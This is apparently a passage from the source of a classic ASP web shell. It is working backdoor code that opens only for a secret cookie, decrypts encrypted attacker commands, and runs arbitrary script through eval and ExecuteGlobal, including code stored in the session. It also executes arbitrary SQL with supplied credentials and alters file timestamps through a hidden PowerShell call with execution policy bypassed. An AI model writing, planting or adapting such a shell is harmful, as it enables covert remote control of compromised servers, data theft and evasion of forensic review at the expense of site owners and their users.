				Server.CreateObject("Shell.Application").NameSpace(mid(fileName,1,InstrRev(fileName,"\")-1)).ParseName(mid(fileName,InstrRev(fileName,"\")+1)).Modifydate=FromUnixTime(mTime,+8)
			end if

			if (Not IsEmpty(aTime) and Not IsNull(aTime) and LCase(CStr(aTime)) <> "none" and aTime <> "") _
				or (Not IsEmpty(cTime) and Not IsNull(cTime) and LCase(CStr(cTime)) <> "none" and cTime <> "") then
				Set ws = GetWS()
				if IsEmpty(ws) then
					SI="E: wscript shell error"
					setFileAttr=SI
					exit function
				end if
				escPath = Replace(fileName, "'", "''")
				psScript = "$p='" & escPath & "';$i=Get-Item -LiteralPath $p;"
				if Not IsEmpty(aTime) and Not IsNull(aTime) and LCase(CStr(aTime)) <> "none" and aTime <> "" then
					psScript = psScript & "$i.LastAccessTime=(Get-Date '1970-01-01').AddSeconds(" & aTime & ").AddHours(8);"
				end if
				if Not IsEmpty(cTime) and Not IsNull(cTime) and LCase(CStr(cTime)) <> "none" and cTime <> "" then
					psScript = psScript & "$i.CreationTime=(Get-Date '1970-01-01').AddSeconds(" & cTime & ").AddHours(8);"
				end if
				cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command """ & psScript & """"
				rc = ws.Run(cmd, 0, True)
				if Err.Number <> 0 then
					SI="E: "&fileName&Err.Description
					Err.Clear
					setFileAttr=SI
					exit function
				end if
				if rc <> 0 then
					SI="E: powershell failed:" & rc
					setFileAttr=SI
					exit function
				end if
			end if
		end if
		If Err Then
			SI="E: "&fileName&Err.Description
			Err.Clear
		Else
			SI="ok"
		End If
		setFileAttr=SI
	End Function

	Function execSql()
		dim conn,dbType,dbHost,dbPort,dbUsername,dbPassword,execSqlCommand,execType,result,v,i,rs,rowStr,RecordsAffected,fieldName
		Set conn = Server.CreateObject("ADODB.Connection")
		dbType=getParameterValue("dbType")
		dbHost=getParameterValue("dbHost")
		dbPort=getParameterValue("dbPort")
		dbUsername=getParameterValue("dbUsername")
		dbPassword=getParameterValue("dbPassword")
		execSqlCommand=getParameterValue("execSql")
		execType=getParameterValue("execType")
		if dbType="sqlserver" and instr(dbHost,"=")=0	then
			connString = "Provider=SQLOLEDB;Data Source=" & dbHost & ";Network Library=DBMSSOCN;User Id=" & dbUsername & ";Password=" & dbPassword & ";"
		else
			connString=dbHost
		end if
		conn.Open connString
		If Err Then
			result=Err.Description
			Err.Clear
		else
			Set rs = conn.Execute(execSqlCommand,RecordsAffected)
			If Err Then
				result=Err.Description
				Err.Clear
			else
				if execType="select" and rs.Fields.Count>0 then
					result="ok"
					result=result&chr(10)
					For i=0 To rs.Fields.Count-1
						fieldName=rs.Fields(i).Name
						if	IsEmpty(fieldName) or IsNull(fieldName) or fieldName="" then
							fieldName="field"&(i+1)
						end if
						result=result&Base64Encode(fieldName)&chr(9)
					Next
					result=result&chr(10)
					While Not (rs.EOF or rs.BOF)
							rowStr=""
						For i=0 To rs.Fields.Count-1
							v=rs(i).Value
							if IsEmpty(v) or IsNull(v) then
								v="null"
							end if
							if IsArray(v) then
								v="Byte Array[]"
							end if
							rowStr=rowStr&Base64Encode(v)&chr(9)
						Next
						result=result&rowStr&chr(10)
						rs.MoveNext
					Wend
					rs.Close
				else 
					result="Query OK, "&RecordsAffected&" rows affected"
				end if
			end if
			conn.close
		end if
		execSql=result
	End Function

	Function includeCode
		dim binCode,codeName
		codeName=getParameterValue("ICodeName")
		binCode=getParameterValue("binCode")
		Session(codeName)=binCode
		includeCode="ok"
	End Function

	Function test()
		test="ok"
	End Function

	Function closeEx
		Session.Abandon()
		closeEx="ok"
	End Function

	Function parseParameter(stream)
		dim key,valueLen,byteValue
		Do While stream.Position < stream.Size
			byteValue = ascb(stream.Read(1))
			if byteValue = &h02 then
				valueLen = ascb(stream.Read(1)) or Lsh(ascb(stream.Read(1)),8) or Lsh(ascb(stream.Read(1)),16) or Lsh(ascb(stream.Read(1)),24)
				Parameters.Add key, stream.Read(valueLen)
				key = ""
			Else
				key = key & chr(byteValue)
			end if
		Loop
	End Function

	Function run(psx)
		on error resume next
		dim methodName,v,codeName
		set BinaryStream = CreateObject("Adodb.Stream")
		BinaryStream.charset = "iso-8859-1"
		BinaryStream.Type = 1
		BinaryStream.Open
		BinaryStream.Write psx
		BinaryStream.Position = 0
		parseParameter(BinaryStream)
		set BinaryStream = Nothing

		methodName=getParameterValue("methodName")
		codeName=getParameterValue("codeName")
		if not IsEmpty(methodName) then
			if IsEmpty(codeName) then
				run=eval(methodName)
			elseif not IsEmpty(Session(codeName)) then
				ExecuteGlobal(Session(codeName))
				run=GlobalResult
			else
				run="codeName or methodName IsEmpty"
			end if
		else
			run="method is null"
		end if
		if	IsEmpty(run) then
			run="no result"
		end if
		if Err then
			run=run&chr(10)&Err.Description
		end if
		if not IsArray(run) then
			run = Stream_StringToBinary(run)
		end if
	End Function

	Function MainEntry()
		on error resume next
		Dim cookieValue, contentType, encryptedBase64, rawBody
		Dim rawBodyBin, encryptedBodyBin
		Dim reqLeft, reqRight, resLeft, resRight, leftPos, rightPos
		Dim reqLeftBin, reqRightBin, reqLeftText, reqRightText, resLeftBin, resRightBin
		Dim encryptedBytes, decryptedBytes, resultBytes, encryptedResultBytes

		cookieValue = GetCookieValue(g_cookie_name)
		if IsEmpty(cookieValue) or IsNull(cookieValue) or cookieValue = "" then
			exit function
		end if

		Response.Clear
		Response.Buffer = True
		Response.ContentType = "application/octet-stream"
		Response.CharSet = ""

		contentType = LCase(Request.ServerVariables("CONTENT_TYPE"))
		if InStr(contentType, "application/x-www-form-urlencoded") > 0 then
			encryptedBase64 = Request.Form(g_param_name)
			if IsEmpty(encryptedBase64) or IsNull(encryptedBase64) or encryptedBase64 = "" then
				exit function
			end if
			encryptedBase64 = NormalizeBase64(encryptedBase64)
			encryptedBase64 = Replace(encryptedBase64, " ", "+")
			encryptedBytes = Base64DecodeEx(encryptedBase64, true)
		else
			if Request.TotalBytes <= 0 then
				exit function
			end if
			rawBodyBin = Request.BinaryRead(Request.TotalBytes)
			if IsEmpty(rawBodyBin) or IsNull(rawBodyBin) then
				exit function
			end if
			Call GenerateBinaryMarker(cookieValue & "mark", g_secret_key, reqLeftBin, reqRightBin)
			rawBody = Stream_BinaryToStringLatin1(rawBodyBin)
			if Len(rawBody) = 0 then
				exit function
			end if
			reqLeftText = Stream_BinaryToStringLatin1(reqLeftBin)
			reqRightText = Stream_BinaryToStringLatin1(reqRightBin)
			leftPos = InStr(1, rawBody, reqLeftText, vbBinaryCompare)
			rightPos = InStrRev(rawBody, reqRightText, -1, vbBinaryCompare)
			if leftPos <= 0 or rightPos <= leftPos then
				exit function
			end if
			encryptedBodyBin = SliceBytes(rawBodyBin, (leftPos - 1) + Len(reqLeftText), rightPos - leftPos - Len(reqLeftText))
			if IsEmpty(encryptedBodyBin) or IsNull(encryptedBodyBin) then
				exit function
			end if
			encryptedBytes = encryptedBodyBin
		end if
		
	decryptedBytes = decryption(encryptedBytes, g_secret_key, true)
		if Err.Number <> 0 then
			Err.Clear
			exit function
		end if
		if IsEmpty(decryptedBytes) or IsNull(decryptedBytes) then
			exit function
		end if

	Parameters.RemoveAll
	resultBytes = run(decryptedBytes)
	if IsEmpty(resultBytes) or IsNull(resultBytes) then
		exit function
	end if

	Call GenerateBinaryMarker(cookieValue, g_secret_key, resLeftBin, resRightBin)
	encryptedResultBytes = decryption(resultBytes, g_secret_key, true)
	if IsEmpty(encryptedResultBytes) or IsNull(encryptedResultBytes) then
		exit function
	end if
	Response.BinaryWrite resLeftBin
	Response.BinaryWrite encryptedResultBytes
	Response.BinaryWrite resRightBin
	End Function
	Call MainEntry
